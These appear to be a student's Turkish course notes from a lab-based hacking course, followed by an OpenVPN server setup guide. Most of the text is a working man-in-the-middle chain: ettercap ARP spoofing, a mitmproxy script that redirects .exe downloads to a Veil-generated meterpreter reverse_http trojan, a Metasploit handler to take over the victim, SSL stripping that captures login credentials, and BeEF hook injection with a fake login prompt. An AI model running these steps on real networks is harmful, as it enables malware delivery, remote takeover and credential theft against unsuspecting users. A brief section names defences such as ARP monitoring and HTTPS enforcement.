+ardından açılan geany penceresindeki File tabından New (Ctrl+N) butonuna basıyoruz
+
+import mitmproxy 
+def request(flow): 
+	print('Burası istekleri veriyor')
+	print(flow)
+def response(flow): 
+	print('Burası cevapları veriyor')
+	print(flow) 
+
+yazıyoruz ardından File tabından Save As e basıyoruz ardından root a yani ( /root ) atil.py olarak kaydediyoruz 
+
+şimdi biraz kodumuzda yazdığımız kelimelerin ne anlama geldiğinden bahsedelim biraz
+
+python programlama dilinde import kelimesi kullanmak istediğimiz kütüphaneyi içeriye almak demek 
+
+bu import işlemi her kütüphaneyi her zaman proje dosyamız içeriisnde kodlarını tutmak boyut olarak çok fazla olabileceğinden ve bu kodların 
+proje dosyamız içerisinde karmaşık bir şekilde gözükebileceğinden dolayı bu ktüphanelere istediğimiz zaman import ederek kullanıyoruz 
+
+bu kütüphanelerde bazı fonksiyonlar , değişkenler , metodlar mevcuttur örneğin biizm kodumuzdaki flow bir değişkendir 
+
+ardından 
+
+kali terminalimize geliyoruz 
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 çalıştırıyoruz 
+
+daha sonra 
+
+ettercap -Tq -M arp:remote -i eth0 -S /10.0.2.4// /10.0.2.1// çalıştırıyoruz 
+
+daha sonra yeni bir terminal tabında /opt/mitmproxy dizinindeyken ./mitmdumb -s /root/atil.py --mode transparent çalıştırıyoruz 
+
+ardından windows sanal makinemize geliyoruz chrome dan seslisozluk.net e gidiyoruz ardından kali de mitmdumb ı çalıştırdığımız 
+terminale gelirsek burada devamlı kurban bilgisayarımızın gerçekleştirmiş olduğu http request ve aldığı response ları 
+
+burada istekler veriliyor 
+
+
+burada cevaplar veriliyor şeklinde başlıkların altında çıktı olarak alıyoruz 
+
+
+bu dersimizde python daki obje özellikleri konusunu öğrenelim 
+
+/root/atil.py dosyamızı sağ tık > open with other application > Geany ile açıyoruz 
+
+ 
+ import mitmproxy 
+def request(flow): 
+	print('Burası istekleri veriyor')
+	print(flow.request)
+#def response(flow): 
+	print('Burası cevapları veriyor')
+	print(flow) 
+
+şeklinde öncelikle response mesajlarını yazdırdığımız kısmı yorum satırı içine alıyoruz çünkü bu derste o kısımla alakalı bir işimiz yok 
+bu kısmı tamamen silmek yerine yorum satırına almamızın sebebi daha sonra bu kısmı kodumuz içerisine dahil edip çalıştırmak istediğimizde 
+en baştan yazmamak için yedekte tutma amacı ile böyle bir şey yaptık başındaki # karakterini kaldırarak da, tekrar programımız içerisinde çalış 
+tırılabilir bir kod a çevirebiliriz 
+
+
+kodumuz içerisinde yazdığımız flow.request kısmındaki flow bir obje / fonksiyondur mitmproxy kütüphanesinin içerisindeki bir fonksiyon 
+yani bir işi yapmak için kullandığımız hazır içerisinde sırayla çeşitli işlemlerin bulunduğu bir işlem listesi / yapacaklar listesi gibi 
+düşünebiliriz bu fonksiyonumuz içerisinde request isminde bir özellik var biz spesifik olarak bu özelliğin çıktısını ekrana bastırmak için 
+böyle bir kod yazdık (flow burada fonksiyon mu obje mi? obje ile fonksiyon arasındaki fark nedir? kodumuzu çalıştırdığımızda flow içerisindeki 
+bütün özellikler çalışıp sadece request özelliğinin çıktıları mı ekrana bastırılacak yoksa bu fonksiyon içeriisnde sadece request özelliği 
+çalıştırılıp bu özelliğin çıktıları mı ekrana bastırılacak? araştır buraya yaz)
+
+gerçek hayattan bir örnek vermek gerekirse 
+
+flow = insan diye kabul edersek 
+
+flow.boy
+flow.yas 
+flow.kütle 
+
+gibi özellikler bir fonksiyonun içerisinde ilgili işi yapan kod parçalarıdır 
+
+daha sonra bu dosyamızı kaydediyoruz ardından kali terminalimize geliyoruz 
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 çalıştırıyoruz 
+
+daha sonra yine aynı terminalde 
+
+ettercap -Tq -M arp:remote -i eth0 -S /10.0.2.4// /10.0.2.1// çalıştırıyoruz  
+
+ardından başka bir terminal tabında -bir öncekini kapatmadan çünkü orada ettercap çalışıyor- 
+
+/opt/mitmproxy dizinindeyken ./mitmdumb -s /root/atil.py --mode transparent çalıştırıyoruz 
+
+ardından windows sanal makinamızdan seslisozluk.net adresine gidiyoruz ardından kali terminalimizde atil.py yi çalıştırdığımız terminalimize geri dönüyoruz 
+bu terminalde çıktı olarak sadece kurban bilgisayarımızın gerçekleştirdiği istekleri yani GET requestleri görüyoruz 
+
+bu dersimizde python daki If (Eğer) kontrolllerini öğrenelim 
+
+ardından Geany ile atil.py dosyamızı açıyoruz ve 
+
+ import mitmproxy 
+def request(flow): 
+	print('Burası istekleri veriyor')
+	print(flow.request.pretty_url)
+#def response(flow): 
+	print('Burası cevapları veriyor')
+	print(flow) 
+
+
+şeklinde kodumuzu değiştirip kaydediyoruz kurban bilgisayarımızın gerçekleştirdiği isteklerden bir filtreleme yaparak sadece sonu .url olan istekleri ekranımıza bastırmak 
+için bu komutu kullandık komutta gördüğümüz gibi normalde bir özellik olan request in de bir özelliği olabilir 
+
+ve iptables ve ettercap komutlarımızı çalıştırarak ağda ortadaki adam olduktan sonra 
+terminalimizde 	
+
+ardından windows sanal makinamızdan seslisozluk.net adresine gidiyoruz ve kali terminalimize döndüğümüzde -atil.py yi çalıştırdığımız terminal- 
+
+kullanıcının yaptığı ve sadece uzantısı .url olan isteklerin yazdırıldığını görüyoruz biz olası bir senaryo olarak örneğin kullanıcının 
+bir resmi görüntülemek veya bir exe yi indirmek için gerçekleştirdiği istekleri görmek ve kodumuzda buna dair bir filtreleme yapmak için 
+(flow.request.pretty_url komutu ile isteklerin .url uzantısına sahip olanları mı filtreliyor yoksa bir isteğin url olması için illa .url 
+uzantısına sahip olması gerekmez mi bunu araştır buraya yaz)
+
+
+ import mitmproxy 
+def request(flow): 
+	if flow.request.pretty_url.endswith('.exe'):
+	print('burada bir .exe dosyası yakaladık')
+	print(flow.request.pretty_url)
+#def response(flow): 
+	print('Burası cevapları veriyor')
+	print(flow)
+
+şeklinde değiştiriyoruz ve file > save diyerek kodumuzu kaydediyoruz 
+
+ardından zaten hali hazırda ip tables ve ettercap çalışıyor olmalı ardından bir başka terminalde 
+
+/opt/mitmproxy dizinindeyken ./mitmdumb -s /root/atil.py --mode transparent çalıştırıyoruz 
+
+ve daha sonra windows sanal makinamıza geçiş yapıyoruz ardından seslisozluk.net adresine gidiyoruz chrome dan 
+
+
+ve herhangi bir şekilde .exe dosyasını içeren bir url e bir reqeust yapmadığımız için bunu çıktılarda göremedik çünkü komutumuzda if 
+yani eğer koşulunu kullanmıştık ve programalamada bu koşul gerçekleşmediği sürece programın devamındaki kodlar çalıştırılmayacaktır 
+ancak terminaldeki diğer çıktılar bizimle alakalı olan kodlar değildir mitmweb ile alakalı olan kodlar olduğu için o kodların çıktısını 
+alıyoruz 
+
+daha sonra winzip.com a gidiyoruz ardından TRY IT FREE butonuna basarak winzip i indiriyoruz ve atil.py nin çalıştırıldığı terminalimize 
+döndüğümüzde ve çıktılarda yukarı doğru scroll up yaptığımızda koyu sarı bir renkte 	
+
+burada bir .exe dosyası yakaladık 
+ilglili-exe-dosyasını-içeren-url 
+
+şeklinde koyu sarı renkte 2 adet çıktı aldığımızı görüyoruz 
+
+(kodumuzda yapılan request içerisinde .exe ifadesinin geçmesini if olarak aldık yoksa .exe dosyası olan url lerin kendine ait bir formatı olduğu 
+için python da bu formatı yapılan requestler içerisinde kontrol edecek bir fonksiyon veya özellik mi kullandık bunu araştır buraya yaz)
+
+bu dersimizde kendi yazdığımız python kodları ile response mesajı oluşturmayı öğrenelim 
+
+iptables ve ettercap komutlarımızı çalıştırıyoruz 
+
+ardından başka bir terminalde /opt/mitmproxy dizinindeyken  ./mitmweb --mode transparent çalıştırıyoruz 
+
+ardından gelen çıktıdaki linki firefox tarayıcımızda açıyoruz 
+
+ardından browserımızdan imdb.com adresine gidiyoruz 
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Status bağlantısından http response status codes ların hangi kodun ne anlama gedliğine bakabiliriz 
+
+örneğin 200 numaralı / sayılı kod ilgili sayfaya yolladığımız isteğimizin kabul olduğu anlamına gelir 
+
+202 numaralı kod Accepted yani siteğimizin kabul edildiği anlamına gelir (200 numaralı kod ile aralarında ne fark var araştır buraya yaz)
+
+daha sonra mitm web de imdb ye yapmış olduğumuz isteğin olduğu pakete geliyoruz ve response tabına giriyoruz response kısmında 
+200 OK isimli bir kod olduğunu görüyoruz işte bu biz sayfaya bir istekte bulunduğumuzda sayfanın bize vermiş olduğu status code udur 
+
+biz de eğer bir response mesajı / paketi oluşturmak istiyorsak kendi response mesajımızda status code kullanmak zorundayız 
+
+daha sonra mitm web i çalıştırdığımız terminale gelip işlemimizi ctrl+c ile durdurup clear çalıştırarak terminalimizi temizliyoruz 
+
+ardından linux dosya gezgininden atil.py dosyamızın olduğu kısma gelip sağ tık > open with other aplication > geany ile açıyoruz  
+
+ import mitmproxy 
+def request(flow): 
+	if flow.request.pretty_url.endswith('.exe'):
+	flow.response = mitmproxy.http.HTTPResponse.make(301, "",{}) --> burada " " içerisine yazdığımız şeyler ne anlama geliyor yani içine yazdığımız değer kullanıcı response mesajını aldığında tarayıcıda gözek bir mesaj gibi bir şey mi araştır buraya yaz
+	#print('burada bir .exe dosyası yakaladık')
+	#print(flow.request.pretty_url)
+#def response(flow): 
+#	print('Burası cevapları veriyor')
+#	print(flow)
+
+bir http response mesajı oluştururken şu 3 maddeyi gerçekleştirmemeiz / oluşturmamız / belirlememiz gerekiyor 
+
+1) HTTP Status (bizim örneğimizde / uygulamamızda bu code 301 olacak)
+
+2) Content (içerik yani http response mesajında kullanıcıya görünecek olan html kodları? yoksa başka bir programlama dilindeki kodlar da olur mu
+yoksa sadece html mi araştır buraya yaz)
+
+3)HTTP Headers (yeni dosyanın konumu)
+
+
+bu dersimizde oluşturacağımız response mesajının içine koymak için bir trojan oluşturmayı öğrenelim 
+
+cd /opt dizinine gidiyoruz terminalimizde ardından cd Veil çalıştırıyoruz daha sonra python3 Veil.py çalıştırıyoruz 
+
+ardıdan update komutunu çalıştırarak Veil toolumuzu güncelliyoruz / update ediyoruz 
+
+ardından Veil has checked for updates, press enter to continue çıktısını alacağız enter tuşuna basıyoruz 
+
+daha sonra list > use 1 > list > use 9 (cs/meterpreter/rev_http.py) > set LHOST 10.0.2.15 (kali-loip-yazıyoruz-yani) > set SLEEP 4 > set PROCESSORS 1 > generate 
+çalıştırıyoruz ve trojanımızı oluşturmuş oluyoruz burada set LPORT 8080 olarak ayarlamadık çünkü zaten halihazırda otomatik olarak ayarlanmıştı 
+tool tarafından 
+
+ardından installation çalıştırarak payloadımıza bir isim veriyoruz ardından exit çalıştırarak tooldan çıkıyoruz 
+
+neden trojanımızın ismini installation olarak verdik çünkü kullanıcımız bir .exe indirmeye çalışacak ve ismini de şüphe çekmeyecek bir şekilde 
+bu şekilde ayarladık
+
+oluşturduğumuz bu trojanı Other Locations > Computer > usr > share > veil-output > compiled  dizninde installation.exe isminde trojanımızı 
+görebiliriz ardından bu installation.exe ye sağ tık > copy yapıyoruz /var/www/html/backdoors dizinine sağ tık Paste yaparak yapıştırıyoruz 
+
+ardından terminalimizden service apache2 start çalıştırıyoruz 
+
+
+bu dersimizde oluşturmuş olduğumuz trojanimizi http response mesajımızın içerisine embed etmeyi öğrenelim 
+
+atil.py dosyamızı geany ile açıyoruz 
+
+
+ import mitmproxy 
+def request(flow): 
+	if flow.request.pretty_url.endswith('.exe'):
+	flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location": "http://10.0.2.15/backdoors/installation.exe"})
+	#print('burada bir .exe dosyası yakaladık')
+	#print(flow.request.pretty_url)
+#def response(flow): 
+#	print('Burası cevapları veriyor')
+#	print(flow)
+
+
+şeklinde değiştirip file > save diyerek kodumuzu kaydediyoruz 
+
+yani kodumuzda kısaca kurban kişi tarayıcısında .exe ifadesini içeren bir url ye bir istekte bulunursa kurbanı konumunu belirttiğimiz ilgili 
+dosyaya yönlendir şeklinde bir kod yazdık 
+
+ardından iptables ve ettercap çalıştırıyoruz ardından başka bir terminalde iken /opt/mitmproxt dizinindeyken 
+
+./mitmdump -s /root/atil.py --mode transparent çalıştırıyoruz 
+
+ardından windows sanal makinemize geliyoruz ve tarayıcımızda history kısmından clear data diyerek geçmişi temizliyoruz 
+
+ardından winzip.com adresine gidiyoruz TRY IT FREE yazan butona tıklıyoruz ve This page isn't working hatası aldık 
+
+bu dersimizde bir önceki bölümün sonunda aldığımız hatanın sebebini ve bu hatayı nasıl çözebiliriz bunu öğrenelim 
+
+kurbanımızın bu ahtayı almasının sebebi biz ağda mitm olduğumuz ve kullanıcı .exe uznatılı bir url ye bir get isteği bulunduğunda onu 
+lokalimizdeki installation.exe uzantılı zararlımızın bulunduğu bağlantımıza yönlendiriyoruz ancak kullanıcı .exe uzantılı bağlantımıza yönlendiril 
+diği için ve bu bağlantımızın url de .exe ile bittiği için tekrar yanı bağlantıya yönlendiriliyor ve yine yönlendirildiği bağlantı .exe uzantılı olacağı için yine yön 
+lendiriliyor ve bu döngü bir yerden sonra chrome un kurban kullanıcımıza hata vermesine sebep oluyor 
+
+bu sorunu çözmek için atil.py dosyamızdaki kodu düzenlememiz lazım 
+
+ardından kalimizde atil.py nin bulunduğu klasörü açıyoruz sağ tık > Geany ile dosyamızı açıyoruz 
+
+
+ import mitmproxy 
+def request(flow): 
+	if flow.request.host  	!= "10.0.2.15" and flow.request.pretty_url.endswith('.exe'):
+	flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location": "http://10.0.2.15/backdoors/installation.exe"})
+	#print('burada bir .exe dosyası yakaladık')
+	#print(flow.request.pretty_url)
+#def response(flow): 
+#	print('Burası cevapları veriyor')
+#	print(flow)
+
+şeklinde yazdığımız komutu değiştiriyoruz (buradaki != eşit değildir anlamına geliyor bir çok programlama dilinde ve devamında yazdığımız 
+ip adresi de bizim kali lokal ip adresimiz yani kısaca kullanıcıyı sadece 10.0.2.15 e yönlendirilirse ve yönlendirildiği yrl nin uzantısı .exe 
+ile bitiyorsa kullanıcıyı bir aşağı satırdaki ip adresine yönlendir diyoruz )
+
+(bir önceki koddaki gibi aynı döngünün gerçekleşmemesinin sebeb, != eşit değil ifadesi çünki ilgili host a yani kali ip adresimize yönlendirince 
+döngü devam etmeyecek çünkü sadece eşit olmadığı zaman kullanıcıyı yönlendir dedik)
+
+ardından kalimize dönüp iptables ve ettercap komutları çalıştırıyoruz 
+
+ardından farklı bir terminal tabında /opt/mitmproxy dizinindeyken ./mitmdumb -s /root/atil.py --mode transparent çalıştırıyoruz 
+
+ardından windows makinamıza geliyoruz ardından chrome a girip history mizi siliyoruz 
+
+ardından winzip.com adresine gidiyoruz try it free butonuna tıklıyoruz ardından inen dosyanın installation.exe olduğunu görüyoruz 
+
+yani winzip in setup dosyası inmedi 
+
+
+
+bu dersimizde indirdiği dosyayı çalıştırdıktan sonra kurban kullanıcının bilgisayarını tamamen ele geçirmeyi öğrenelim 
+
+öncelikle kali terminalimizden msfconsole çalıştırıyoruz ardından toolumuz açıldıktan sonra use exploit/multi/handler çalıştırıyoruz 
+
+ardından set PAYLOAD windows/meterpreter/reverse_http çalıştırıyoruz > shop options > set LHOST 10.0.2.15 > exploit  çalıştırıyoruz 
+
+bize daha önce 8080 portunu kullandınız veya halihazırda kullanıyorsunuz anlamında bir hata mesajı verecek bunun sebbei ettercap veya 
+mitmdumb dan birisi veya 2 si de oalbilir 8080 de çalıştığı için bir çakışma oluyor ve msfconsole bunu tespit ettiği için bir hata verdi bu iki terminalde 
+de çalışan ettercap ve mitmdumb ı ctrl+c ile kapatıyoruz 
+
+ardından tekrar msfconsole terminaline dönüyoruz ve exploit çalıştırıyoruz böyle bir hata almamak için LPORT 4444 şeklinde ayarlayarak trojanımızı 
+o şekilde oluşturabiliriz 
+
+ardından windows sanal makinamıza dönüp interdiğimiz installation.exe yi çalıştırıyoruz 
+
+ardından kali msfconsole terminaline geldiğimiz zaman bir session açıldığını görebiliriz 
+
+enter tuşuna basıp sessions -l > session-1 (listelenen çıktıda hangi oturuma bağlanmak istiyorsak onu seçiyoruz) çalıştırıyoruz 
+
+python daki kodlarımızı .jpg veya .jpeg / .png şeklinde resim dosyalarının indirildiği duruma uygun bir senaryoda da çalışmaya uygun bir hale 
+getirebiliriz 
+
+
+ssl strip ile mitmproxy yi birlikte çalıştırırsak ikisinden birinin sorunlu bir şekilde çalıştığını görebiliriz çünkü ikisi de bir proxy olduğu için 
+çakışma olabiliyor ama mitmproxy üzerinden bir sslstrip işlemi gerçekleştirebiliriz 
+
+https://github.com/mitmproxy/mitmproxy/blob/main/examples/contrib/sslstrip.py adresinden mitmproxy içerisinde kullanabileceğimiz sslstrip 
+
+aracının kodlarını görebiliriz eğer bu bağlantıda kodumuzun hemen sağ üstünde bulunan Raw butonuna basarsak ilgili toolumuzun kodlarının tamamını 
+text bir şekilde karşımıza geldiğini görürüz 
+
+biz buradaki bütün kodları ctrl+a yapıp kopyalıyoruz 
+
+ardından kalimizden Geany i açıyoruz File tabından New diyerek yeni bir dosya açıyoruz ve buraya sağ tık > Paste yapıp kodlarımızı yapıştırıyoruz 
+
+ardından File > Save As diyoruz /root/sslstripmitm.py şeklinde dosyamızı kaydediyoruz (dosyamıza isim verdikten sonra sağ üstteki mavi Save butonuna basarak dosyamızı kaydediyoruz)
+
+bu dersimizde bir adet windows ve bir adet kali makinamızla çalışıyoruz bunun için ikisini de NAT Network e alıp başlatıyoruz 
+
+kali terminalimize gelip ettercap -Tq -M arp:remote -i eth0 -S /172.20.10.7// /172.20.10.1// çalıştırıyoruz (ilk ip hedef ip ikinci girdiğimiz ip modemin ipsidir)
+
+yeni bir terminal açıyoruz kalimizde /opt/mitmproxy dizinindeyken ./mitmdumb -s /root/sslstripmitm.py --mode transparent çalıştırıyoruz 
+
+ardından her zamanki iptables komutunu çalıştırıyoruz yönlendirme yapmak için 
+
+ardından windows makinamıza geliyoruz chrome u açıp history i temizliyoruz öncelikle http siteleri açarken bir problem yaşıyor muyuz bunu görmek için 
+
+seslisozluk.net e gidiyoruz ve siteyi başarılı bir şekilde açtı daha sonra https bir siteye gidelim örneğin hotmail.com 
+
+hotmail e gitmek istediğimiz zaman windows bizi outlook a yönlendiriyor (bu normal bir işlem biizmle bir alakası yok normal bir şekilde 
+girseydik de aynı şekilde yönlendirecekti) ardından hesabımıza girmek için Sign In butonuna basıyoruz ve http bir şekilde açtığını başarılı bir 
+şekilde downgrade ettiğimizi görüyoruz bunu teyit etmek için atilsamancioglu yazıp Next butonuna basıyoruz Password olarak 123456 yazıp Sign in 
+diyoruz ardından kali terminalimize gelip ettercap i çalıştırdığımız terminale gelirsek aldığımız çıktılarda 
+USER: atilsamancioglu PASS: 123456 şeklinde bilgileri aldığımızı görebiliriz 
+
+bu dersimizde https beef injection nasıl yapılır bunu öğrenelim 
+
+kali terminalimizde beef i çalıştırıyoruz gelen çıktıda Example: <script src?"http://127.0.0.1:3000/hook.js"></script> kodunu kopyalıyoruz (biz beef i çalıştırdığımızda farklı bir kod olabilir hangi kod varsa onu kopyalıyoruz bunu örnek olarak yazdım)
+ardından browserımızda beef in çalıştığı ip ve port üzerinden beef in ui ını açıyoruz çalıştığından emin olmak için 
+
+daha sonra başka bir kali terminalimizde /opt/mitmproxy dizinindeyken ./mitmdumb --mode transparent -s /root/sslstripmitm.py --replace :~s:"</body>":"<script src?"http://kali-local-ipmiz:3000/hook.js"></script>"
+çalıştırmadan hemen önce ip tables ve ettercap komutlarımızı çalıştırıyoruz  
+
+ ardından windows sanal makinamızdan chrome history mizi temizledikten sonra download.com adresine gidiyoruz ve http bir şekilde açmayı başardığımızı 
+ görüyoruz sitemizi ardından kali beef ui ımıza geliyoruz ardından beef beef şeklinde default kullanıcı adı ve şifre ile login oluyoruz 
+ daha sonra sol üst tarafta Online Browsers başlığının altında windows sanal makinamızı hook ettiğimizi görüyoruz 
+
+ eğer online browsers kısmına birden fazla online browser gözüküyorsa Pretty Thief gibi vb saldırı modüllerini çalıştırmak itstediğimiz zaman 
+ kurban cihazımızda çalışmayabilir bunun için beef in bulunduğu sayfaya f5 tuşu ile refresh atıyoruz ve online browsers tabında yalnızca bir tane 
+ cihaz olduğunu görüyoruz daha (refresh etmemize rağmen birden fazla cihazı hook ettiysek bu duurmda ne yapabiliriz onu araştırıp buraya yaz 
+ birinin bağlantısını nasıl kesebiliriz saldırımızın düzgün çalışması için örn?) ardından hook ettiğimiz cihazı seçiyoruz sol taraftan daha sonra 
+ hemen sol taraftaki Module Tree bölümünden pretty thief aratıyoruz ve çıkan sonuca tıklıyoruz daha sonra sağ alttaki executr butonuna 
+ basıyoruz ve windows makinamıza gittiğimizde fake facebook session alert in çıktığını görebiliriz 
+
+ email : testest 
+ password : 123456 şeklinde buraya submit ediyoruz windows cihazımızdan 
+
+ ardından kali beef ui a geldiğimizde module tree kısmının hemen sağında Module Results History kısmındaki sonuçlardan bir tanesine tıkladığımızda 
+ hemen sağda command results kısmında answer=testest:123456 şeklinde bilgileri aldığımızı görebiliriz 
+
+
+bu dersimizde kali-windows NAT Network de başlatıyoruz
+
+kali terminalimizde service apache2 start çalıştırıyoruz 
+
+ardından başka bir terminalde ettercap ve iptables çalıştırıyoruz 
+
+ardından başka bir terminalde ./mitmdumb -s /root/atil.py -s /root/sslstripmitm.py çalıştırıyoruz --mode transparent çalıştırıyoruz 
+
+(yani mitmdumb ile bir saldırıda birden fazla script çalıştırabiliyoruz)
+
+ardından windows makinamızdan windows edge i açıyoruz (chrome ile çok fazla deneme yapmıştık yine bu uygulamada chrome veya mozilla  yı da 
+deneyebiliriz)
+
+www.download.com adresine gidiyoruz sitedeki sağ tarafta POPPULAR DOWNLOADS kısmından bir antivirüs ü seçiyoruz (antivirüsü seçmemizin sebebi son kullanıcılar bu siteyi antivirüs için indirmek için kullandığı senaryolarda onlara virüslü bir dosya indirtebileceğimizle ilgili bir örnek yapmak için)
+
+ardından açılan sayfada yeşil renkli         DOWNLOAD NOW        butonuna tıklıyoruz 
+                                            secure download
+
+ardından eğer otomatik olrak inmezse .exe dosyamız sayfadaki mavi renkli restart the download yazısına tıklıyoruz 
+
+ardından indirilecek .exe dosyasını bilgisayarımıza kaydetmek için Save butonuna tıklıyoruz 
+
+ve indirilen dosya bir antivirüs kurulum dosyası değil bizim oluşturduğumuz bir trojan dosyası olduğunu görüyoruz 
+
+bu dersimizde mitm saldırılarından nasıl kaçınabiliriz konusu ile ilgili farkındalık konusunu öğrenelim 
+
+xARP isimli programı kullanarak bağlı olduğumuz ağa bir ARP saldırısı yapılırsa bize haber veriyor 
+
+HTTPS Everwhere isimli eklentiyi kullandığımız tarayıcıya kurarak mitm saldırısı altında olsak bile downgrade işlemlerini engelleyebiliriz 
+browserımızda 
+
+bu dersimizde bir vpn sunucu nasıl oluşturulur ve oluşturduğumuz bu vpn sunucusu ile kendimize nasıl vpn hizmeti sağlayabiliriz bunu öğrenelim 
+
+vpn sunucumuzu digitalocean isimli bir website üzeirnden yaptığımız için (illa bu websitesi olmak zorunda değil sadece bizim uygulamalarımızda bu websiteyi kullanıyoruz)
+
+İlerleyen bölümlerde DigitalOcean'da hesap açarken ücretsiz kredi kazanmak için bu linkle tıklayıp kayıt olabilirsiniz:
+
+https://m.do.co/c/5ecb7c546723
+
+bu dersimizde vpn sunucumuzu oluşturalım 
+
+ardından tarayıcımızdan digitalocean.com adresine gidiyoruz e-mail ve password ile hesabımızı oluşturuyoruz 
+
+ardından emailimizde hesabımızı doğruluyoruz ardından kredi kartı bilgilerimizi vs istiyor bu bilgilerimizi girip devam ediyoruz 
+
+ardından Create New Droplet butonuna basıyoruz ardından Choose an image kısmından Ubuntuyu seçiyoruz daha sonra scroll down yapıyoruz 
+
+Choose a size kısmından MEMORY si 1 GB olan paketi seçiyoruz ve tekrar scroll down yapıyoruz Choose a datacenter region kısmından 
+
+Amsterdam ı seçiyoruz ardından sayfanın en altında bulunan yeşil Create butonuna basıyoruz 
+
+ardından ekranda Droplets kısmında oluşturduğumuz makina çıkıyor bu makinanın IP Adress kısmındaki ip adresini kopyalıyoruz 
+
+örneğin (159.65.196.52) --> temsili bir ip adresidir 
+
+ardından kali terminalimize geliyoruz ssh root@sunucumuzun-ip-adresi çalıştırıyoruz ardından e-mailimize gelen root şifremizi öğrenip 
+şifremizi giriyoruz entera basıyoruz tekrar aynı şifreyi soruyor tekrar yazıp enterlıyoruz 
+
+ardından Enter new UNIX password diyor yani yani bir şifre oluşturuyoruz ve bu şifreyi tekrar yazarak onaylıyoruz 
+
+ve ardından terminal root@ubuntu şeklinde açılıyor yani bu ubuntu sunucumuza giriş yaptığımız anlamına geliyor 
+
+ardından root olarak değil de normal bir kullanıcı oluşturup ona elle yetki vererek güvnelik açısından daha doğru olduğu için suncuya o 
+kullanıcı ile openvpn kurmak için sunucumuza bağlı iken terminalde adduser atilsam çalıştırıyoruz ardından bu kullanıcıya bir şifre vermemizi istiyor 
+şifremizi 2 defa girip enterlıyoruz 
+
+bizden 
+
+Full Name 
+Room Number 
+Work Phone 
+Home Phone 
+Other 
+
+şeklinde bilgiler isterse enterlıyoruz bir şey yazmadan bu bilgileri boş bırakıyoruz 
+
+ardından Y yazıp enterlıyoruz şimdi de yeni oluşturduğumuz bu kullanıcıya admin yetkileri verelim 
+
+terminalimizde usermode -aG sudo atilsam çalıştırıyoruz 
+
+eğer dilersek public key authentication ile artık bu oluşturduğumuz authentication key i ile giriş yapaibliriz sunucumuza normal şifre ile değil 
+bunu da ekleyebilriz ama opsiyonel 
+
+https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04 bağlantısından vpn kurarken karşımıza 
+çıkan aşamaları nasıl gerçekleştirebiliriz öğrenebiliriz
+
+public authentication key i oluşturduktan sonra sunucumuza giriş yaparken klask credential şifre ile girişi engeleyebiliriz güvenlik açıısndan 
+
+şimdi openvpn i kurarken gerekli olan bütün adımları içeren bir bash komutu çalıştıralım bu bash komutunu 
+
+https://github.com/Nyr/openvpn-install bağlantısındaki kodları kullanarak yapıyoruz 
+
+ardından sunucuya bağlı olduğumuz terminalde wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh çalıştırıyoruz 
+
+ardından ekranda bir ip adresini göteriyor eğer bu ip adresi biizm sunucumuzun ip adresi ise entera basıyoruz ardından vpnimizi 
+kurarken hangi protkolü seçmek istediğimizi soruyor UDP / TCP biz UDP protokolünü seçelim çünkü daha iyi bir sonuç veriyor ve recommended 
+yani udp seçilmesi öneriliyor (nedne öneriliyor sebebini araştır buraya yaz)
+
+ardından UDP nin numarası olan 1 yazıp enterlıyoruz udp genelde 1194 portunu kullandığı için bu port üzerinden dinleme yapacağını 
+söylüyor eğer 1194 portunda başka bir işlemimiz yoksa çakışma durumu oluşturmayacak bunu da enterlıyoruz 
+şimdi bizden bir dns serverı seçmemizi istiyor biz burada OpenDNS i seçiyoruz 3 yazıp enterlıyoruz ardından bağlanılacak kişinin ismi 
+anlamında bir client name oluşturmamızı istiyor defualt olarak atadığı client ismi ile oluşturabiliriz o yüzden entera basıp devam ediyoruz 
+şimdide herhangi bir tuşa basarak openvpn oluşturma işlemini otomatik olarak başlatıyoruz 
+
+bu dersimizde oluşturduğumuz vpn severımızın dns ayarlarını yapmayı öğrenelim 
+
+indirdiğimiz bash scriptini çalıştırdıktan sonra bütün işlemler bittikten sonra /root/client.ovpn isminde bir dosya oluşturuldu 
+
+şimdi sunucumuzda oluşturulan bu ovpn dosyamızı kali lokalimize indirip orada çalıştırmamız gerekiyor 
+
+önelikle eğer hala ubuntu serverımıza bir bağlantımız varsa exit çalıştırarak bu bağlantımızı sonlandırıyoruz 
+
+scp root@ubuntu-server-public-ipsi:/root/client.ovpn /root komutu ile copy komutunu uzaktan kullanmak için bir komut çalıştırıyoruz (scp komutunun açılımı nedir araştır buraya yaz)
+
+bu komut ilgili uzak serverdaki bir dosyayı lokalimize kopyalamamızı sağlayan bir komuttur 
+
+scp root@sunucu-public-ip kopyalanacak-dosya-dizini kopyalanacak-dizin şeklinde komutumuzu çalıştırabiliriz 
+
+ardından root şifremizi giriyoruz ardından ilgili dosyamızın local /root dizinimize kopyalandığını görüyoruz 
+
+ardından kali terminalimizden cd /root çalıştırıyoruz openvpn --config client.ovpn çalıştırıyoruz bağlantımızın gerçekleştiğini teyit / onay lamak için 
+
+public ip mizi kontrol edelim herhangi bir siteye gittiğimizde eğer loading ekranında kalıyorsa büyük ihtimalle dns yapılandırmamızda bir problem vardır 
+
+terminalden ping google.com çalıştırıyoruz ping:google.com: name or service not known hatasını aldık 
+
+ardından kali terminalimizden nano /etc/dhcp/dhClient.conf çalıştırıyoruz 
+
+bu dökumanımız içeriisnde #prepend domain-name servers, 8.8.8.8 8.8.4.4; satırının başındaki # karakterini silerek 
+
+prepend domain-name servers, 8.8.8.8 8.8.4.4; şeklinde bırakıyoruz 
+
+ardından ctrol+o ardından ctrl+x yapıp kaydedip dökumandan çıkıyoruz 
+
+ardından kali terminalimizde service network-manager restart çalıştırıyoruz ardından whatismyipaddress.com adresine gidiyoruz 
+
+(tabii bu işlemi gerçekleştirirken openvpn dosyasını çalıştırdığımız terminal arka tarafta çalışıyor olmalı çalışmıyorsa dçkumanı değiştirdikten sonra 
+onu çalıştırıp service network-manager restart yazıp public ip mizi kontrol edebiliriz)
+
+ekranda My IP Address is 159.65.196.62 yani ubuntu serverımızın ip adresi göösteriyorsa openvpn başarıyla çalışmıştır demektir 
+
+şimdi de vpn serverlarının sahibi olan insanlar vpn hizmeti sattıkları insanların ne gibi internet trafiklerini izleyebiliyor 
+bunu öğrenelim bu videoda
+
